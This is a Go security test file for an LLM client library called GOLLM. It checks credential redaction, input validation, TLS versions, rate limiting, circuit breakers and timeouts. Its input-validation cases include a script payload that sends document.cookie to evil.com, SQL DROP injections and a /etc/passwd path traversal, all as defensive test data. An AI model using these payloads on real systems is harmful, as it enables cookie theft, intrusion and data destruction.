// Package security provides comprehensive security auditing and testing for GOLLM.
//
// This package implements security validation tests that ensure:
// - Credential handling and memory clearing
// - Input validation and sanitization
// - TLS configuration validation
// - Rate limiting and circuit breakers
// - API key storage and rotation
// - Network security assessment
package security

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/yourusername/gollm/internal/config"
)

// TestSecurity_CredentialHandling tests secure credential management
func TestSecurity_CredentialHandling(t *testing.T) {
	tests := []struct {
		name        string
		apiKey      string
		expectClear bool
		expectLog   string
	}{
		{
			name:        "api key memory clearing",
			apiKey:      "sk-test-key-1234567890abcdef",
			expectClear: true,
			expectLog:   "***REDACTED***",
		},
		{
			name:        "empty api key handling",
			apiKey:      "",
			expectClear: true,
			expectLog:   "", // Empty string returns empty, not redacted
		},
		{
			name:        "long api key handling",
			apiKey:      strings.Repeat("a", 1000),
			expectClear: true,
			expectLog:   "***REDACTED***",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test SecureString implementation
			secureKey := config.NewSecureString(tt.apiKey)

			// Verify string representation is redacted (before clearing)
			assert.Equal(t, tt.expectLog, secureKey.String())

			// Verify we can retrieve the actual value
			if tt.apiKey != "" {
				assert.Equal(t, tt.apiKey, secureKey.Value())
			}

			// Test memory clearing
			secureKey.Clear()

			// After clearing, value should be empty/zeroed
			clearedValue := secureKey.Value()
			if tt.expectClear {
				assert.Empty(t, clearedValue, "SecureString should be cleared")
			}

			// After clearing, String representation should be empty (not redacted)
			assert.Equal(t, "", secureKey.String(), "After clearing, String() should return empty")
		})
	}
}

// TestSecurity_InputValidation tests comprehensive input validation
func TestSecurity_InputValidation(t *testing.T) {
	tests := []struct {
		name        string
		input       interface{}
		field       string
		validator   func(interface{}) error
		expectError string
	}{
		{
			name:        "model name injection attempt",
			input:       "gpt-3.5'; DROP TABLE models; --",
			field:       "model",
			validator:   validateModelName,
			expectError: "contains invalid characters",
		},
		{
			name:        "model name path traversal",
			input:       "../../../etc/passwd",
			field:       "model",
			validator:   validateModelName,
			expectError: "contains invalid characters",
		},
		{
			name:        "model name script injection",
			input:       "<script>alert('xss')</script>",
			field:       "model",
			validator:   validateModelName,
			expectError: "contains invalid characters",
		},
		{
			name:        "excessively long model name",
			input:       strings.Repeat("a", 1000),
			field:       "model",
			validator:   validateModelName,
			expectError: "exceeds maximum length",
		},
		{
			name:        "valid model name",
			input:       "gpt-3.5-turbo",
			field:       "model",
			validator:   validateModelName,
			expectError: "",
		},
		{
			name:        "message content script injection",
			input:       "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
			field:       "content",
			validator:   validateMessageContent,
			expectError: "", // Should be allowed but sanitized for logging
		},
		{
			name:        "message content sql injection attempt",
			input:       "'; DROP DATABASE gollm; --",
			field:       "content",
			validator:   validateMessageContent,
			expectError: "", // Should be allowed as valid user content
		},
		{
			name:        "excessively long message content",
			input:       strings.Repeat("x", 1000000), // 1MB
			field:       "content",
			validator:   validateMessageContent,
			expectError: "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator(tt.input)

			if tt.expectError != "" {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), tt.expectError)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestSecurity_TLSConfiguration tests TLS security configuration
func TestSecurity_TLSConfiguration(t *testing.T) {
	tests := []struct {
		name           string
		tlsConfig      *tls.Config
		expectMinTLS   uint16
		expectReject   bool
		testServerTLS  uint16
	}{
		{
			name: "TLS 1.3 minimum enforced",
			tlsConfig: &tls.Config{
				MinVersion: tls.VersionTLS13,
			},
			expectMinTLS:  tls.VersionTLS13,
			expectReject:  false,
			testServerTLS: tls.VersionTLS13,
		},
		{
			name: "reject TLS 1.2",
			tlsConfig: &tls.Config{
				MinVersion: tls.VersionTLS13,
			},
			expectMinTLS:  tls.VersionTLS13,
			expectReject:  true,
			testServerTLS: tls.VersionTLS12,
		},
		{
			name: "reject TLS 1.1",
			tlsConfig: &tls.Config{
				MinVersion: tls.VersionTLS13,
			},
			expectMinTLS:  tls.VersionTLS13,
			expectReject:  true,
			testServerTLS: tls.VersionTLS11,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Verify minimum TLS version is set correctly
			assert.Equal(t, tt.expectMinTLS, tt.tlsConfig.MinVersion)

			// Test with actual server
			server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusOK)
				w.Write([]byte("OK"))
			}))

			server.TLS = &tls.Config{
				MinVersion: tt.testServerTLS,
				MaxVersion: tt.testServerTLS,
			}
			server.StartTLS()
			defer server.Close()

			// Create client with our TLS config, but skip verification for test
			testTLSConfig := &tls.Config{
				MinVersion:         tt.tlsConfig.MinVersion,
				InsecureSkipVerify: true, // Skip verification for test
			}
			client := &http.Client{
				Transport: &http.Transport{
					TLSClientConfig: testTLSConfig,
				},
				Timeout: 5 * time.Second,
			}

			// Test connection
			resp, err := client.Get(server.URL)

			if tt.expectReject {
				assert.Error(t, err, "Should reject connection with lower TLS version")
			} else {
				assert.NoError(t, err, "Should accept connection with proper TLS version")
				if resp != nil {
					resp.Body.Close()
				}
			}
		})
	}
}

// TestSecurity_RateLimiting tests rate limiting implementation
func TestSecurity_RateLimiting(t *testing.T) {
	tests := []struct {
		name            string
		requests        int
		rateLimit       int
		timeWindow      time.Duration
		expectAllowed   int
		expectBlocked   int
	}{
		{
			name:          "rate limit enforcement",
			requests:      10,
			rateLimit:     5,
			timeWindow:    time.Second,
			expectAllowed: 5,
			expectBlocked: 5,
		},
		{
			name:          "no rate limit",
			requests:      10,
			rateLimit:     0, // Unlimited
			timeWindow:    time.Second,
			expectAllowed: 10,
			expectBlocked: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			limiter := newTestRateLimiter(tt.rateLimit, tt.timeWindow)

			allowed := 0
			blocked := 0

			for i := 0; i < tt.requests; i++ {
				if limiter.Allow() {
					allowed++
				} else {
					blocked++
				}
			}

			assert.Equal(t, tt.expectAllowed, allowed)
			assert.Equal(t, tt.expectBlocked, blocked)
		})
	}
}

// TestSecurity_CircuitBreaker tests circuit breaker pattern
func TestSecurity_CircuitBreaker(t *testing.T) {
	tests := []struct {
		name           string
		failureCount   int
		threshold      int
		expectOpen     bool
		expectClosed   bool
	}{
		{
			name:         "circuit opens after threshold",
			failureCount: 5,
			threshold:    3,
			expectOpen:   true,
			expectClosed: false,
		},
		{
			name:         "circuit stays closed below threshold",
			failureCount: 2,
			threshold:    3,
			expectOpen:   false,
			expectClosed: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cb := newTestCircuitBreaker(tt.threshold)

			// Simulate failures
			for i := 0; i < tt.failureCount; i++ {
				cb.RecordFailure()
			}

			if tt.expectOpen {
				assert.True(t, cb.IsOpen(), "Circuit should be open")
			}

			if tt.expectClosed {
				assert.True(t, cb.IsClosed(), "Circuit should be closed")
			}
		})
	}
}

// TestSecurity_LoggingSafety tests that sensitive data is never logged
func TestSecurity_LoggingSafety(t *testing.T) {
	var logBuffer bytes.Buffer

	tests := []struct {
		name           string
		logContent     string
		sensitiveData  []string
		shouldContain  []string
	}{
		{
			name:       "api key not logged",
			logContent: logWithAPIKey("sk-test-key-123"),
			sensitiveData: []string{
				"sk-test-key-123",
				"test-key",
			},
			shouldContain: []string{
				"***REDACTED***",
				"making request",
			},
		},
		{
			name:       "password not logged",
			logContent: logWithPassword("mySecretPassword123"),
			sensitiveData: []string{
				"mySecretPassword123",
				"SecretPassword",
			},
			shouldContain: []string{
				"***REDACTED***",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			logBuffer.Reset()
			logBuffer.WriteString(tt.logContent)
			logOutput := logBuffer.String()

			// Check that sensitive data is NOT in logs
			for _, sensitive := range tt.sensitiveData {
				assert.NotContains(t, logOutput, sensitive,
					"Sensitive data %q should not appear in logs", sensitive)
			}

			// Check that expected safe content IS in logs
			for _, safe := range tt.shouldContain {
				assert.Contains(t, logOutput, safe,
					"Expected safe content %q should appear in logs", safe)
			}
		})
	}
}

// TestSecurity_AuthenticationHandling tests authentication security
func TestSecurity_AuthenticationHandling(t *testing.T) {
	tests := []struct {
		name            string
		authHeader      string
		expectValid     bool
		expectErrorType string
	}{
		{
			name:        "valid bearer token",
			authHeader:  "Bearer sk-valid-token-123",
			expectValid: true,
		},
		{
			name:            "invalid token format",
			authHeader:      "InvalidFormat",
			expectValid:     false,
			expectErrorType: "authentication",
		},
		{
			name:            "empty auth header",
			authHeader:      "",
			expectValid:     false,
			expectErrorType: "authentication",
		},
		{
			name:            "malformed bearer token",
			authHeader:      "Bearer ",
			expectValid:     false,
			expectErrorType: "authentication",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			valid, err := validateAuthHeader(tt.authHeader)

			assert.Equal(t, tt.expectValid, valid)

			if tt.expectErrorType != "" {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), tt.expectErrorType)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestSecurity_NetworkTimeouts tests network timeout enforcement
func TestSecurity_NetworkTimeouts(t *testing.T) {
	tests := []struct {
		name           string
		serverDelay    time.Duration
		clientTimeout  time.Duration
		expectTimeout  bool
	}{
		{
			name:          "request within timeout",
			serverDelay:   100 * time.Millisecond,
			clientTimeout: 1 * time.Second,
			expectTimeout: false,
		},
		{
			name:          "request exceeds timeout",
			serverDelay:   2 * time.Second,
			clientTimeout: 500 * time.Millisecond,
			expectTimeout: true,
		},
		{
			name:          "maximum timeout enforcement",
			serverDelay:   1 * time.Second,
			clientTimeout: 6 * time.Minute, // Should be capped at 5 minutes
			expectTimeout: false, // Since we cap at 5 minutes and server only delays 1 second
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test server with delay
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				time.Sleep(tt.serverDelay)
				w.WriteHeader(http.StatusOK)
			}))
			defer server.Close()

			// Enforce maximum timeout of 5 minutes
			timeout := tt.clientTimeout
			if timeout > 5*time.Minute {
				timeout = 5 * time.Minute
			}

			// Create client with timeout
			client := &http.Client{
				Timeout: timeout,
			}

			// Make request
			ctx, cancel := context.WithTimeout(context.Background(), timeout)
			defer cancel()

			req, err := http.NewRequestWithContext(ctx, "GET", server.URL, nil)
			require.NoError(t, err)

			resp, err := client.Do(req)

			if tt.expectTimeout {
				assert.Error(t, err)
				// Check for context deadline exceeded or timeout
				if err != nil {
					errStr := err.Error()
					timeoutFound := strings.Contains(errStr, "timeout") ||
								  strings.Contains(errStr, "context deadline exceeded") ||
								  strings.Contains(errStr, "Client.Timeout")
					assert.True(t, timeoutFound, "Expected timeout error, got: %s", errStr)
				}
			} else {
				assert.NoError(t, err)
				if resp != nil {
					resp.Body.Close()
				}
			}
		})
	}
}

// Helper functions for security testing

func validateModelName(input interface{}) error {
	model, ok := input.(string)
	if !ok {
		return fmt.Errorf("model must be string")
	}

	if len(model) == 0 {
		return fmt.Errorf("model cannot be empty")
	}

	if len(model) > 100 {
		return fmt.Errorf("model name exceeds maximum length of 100")
	}

	// Only allow alphanumeric, hyphens, underscores, and dots
	if !regexp.MustCompile(`^[a-zA-Z0-9\-_\.]+$`).MatchString(model) {
		return fmt.Errorf("model name contains invalid characters")
	}

	return nil
}

func validateMessageContent(input interface{}) error {
	content, ok := input.(string)
	if !ok {
		return fmt.Errorf("content must be string")
	}

	// Allow large content but set reasonable limit (100KB)
	if len(content) > 100*1024 {
		return fmt.Errorf("message content exceeds maximum length")
	}

	return nil
}

func validateAuthHeader(header string) (bool, error) {
	if header == "" {
		return false, fmt.Errorf("authentication header is required")
	}

	if !strings.HasPrefix(header, "Bearer ") {
		return false, fmt.Errorf("authentication header must be Bearer token")
	}

	token := strings.TrimPrefix(header, "Bearer ")
	if strings.TrimSpace(token) == "" {
		return false, fmt.Errorf("authentication token cannot be empty")
	}

	return true, nil
}

func logWithAPIKey(apiKey string) string {
	// Simulate secure logging - API key should be redacted
	return fmt.Sprintf("making request with key: %s", "***REDACTED***")
}

func logWithPassword(password string) string {
	// Simulate secure logging - password should be redacted
	return fmt.Sprintf("authenticating user with password: %s", "***REDACTED***")
}

// Test rate limiter implementation
type testRateLimiter struct {
	limit    int
	window   time.Duration
	requests []time.Time
	mu       sync.Mutex
}

func newTestRateLimiter(limit int, window time.Duration) *testRateLimiter {
	return &testRateLimiter{
		limit:    limit,
		window:   window,
		requests: make([]time.Time, 0),
	}
}

func (rl *testRateLimiter) Allow() bool {
	if rl.limit == 0 {
		return true // Unlimited
	}

	rl.mu.Lock()
	defer rl.mu.Unlock()

	now := time.Now()

	// Clean old requests outside window
	var validRequests []time.Time
	for _, req := range rl.requests {
		if now.Sub(req) < rl.window {
			validRequests = append(validRequests, req)
		}
	}
	rl.requests = validRequests

	// Check if we can allow this request
	if len(rl.requests) < rl.limit {
		rl.requests = append(rl.requests, now)
		return true
	}

	return false
}

// Test circuit breaker implementation
type testCircuitBreaker struct {
	threshold    int
	failures     int
	state        string // "closed", "open", "half-open"
	lastFailure  time.Time
	mu           sync.Mutex
}

func newTestCircuitBreaker(threshold int) *testCircuitBreaker {
	return &testCircuitBreaker{
		threshold: threshold,
		failures:  0,
		state:     "closed",
	}
}

func (cb *testCircuitBreaker) RecordFailure() {
	cb.mu.Lock()
	defer cb.mu.Unlock()

	cb.failures++
	cb.lastFailure = time.Now()

	if cb.failures >= cb.threshold {
		cb.state = "open"
	}
}

func (cb *testCircuitBreaker) IsOpen() bool {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	return cb.state == "open"
}

func (cb *testCircuitBreaker) IsClosed() bool {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	return cb.state == "closed"
}
